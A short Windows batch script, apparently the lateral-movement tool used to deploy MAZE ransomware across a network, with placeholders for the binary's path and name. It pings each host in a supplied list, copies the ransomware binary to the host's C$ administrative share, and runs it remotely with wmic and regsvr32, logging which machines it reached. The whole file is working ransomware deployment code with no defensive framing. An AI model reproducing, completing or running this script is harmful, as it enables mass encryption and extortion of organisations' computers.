@echo off
del done.txt
del offline.txt
rem Loop thru list of computer names in file specified on command-line
for /f %%i in (%1) do call :check_machine %%i
goto end
:check_machine
rem Check to see if machine is up.
ping -n 1 %1|Find "TTL=" >NUL 2>NUL
if errorlevel 1 goto down
echo %1
START cmd /c "copy [Location of MAZE binary] \\%1\c$\windows\temp && exit"
timeout 1 > NUL
echo %1 >> done.txt
rem wmic /node:"%1" process call create "regsvr32.exe /i C:\windows\temp\[MAZE binary name]" >> done.txt
START "" cmd /c "wmic /node:"%1" process call create "regsvr32.exe /i C:\windows\temp\[MAZE binary name]" && exit"
goto end
:down
  rem Report machine down
  echo %1 >> offline.txt
:end

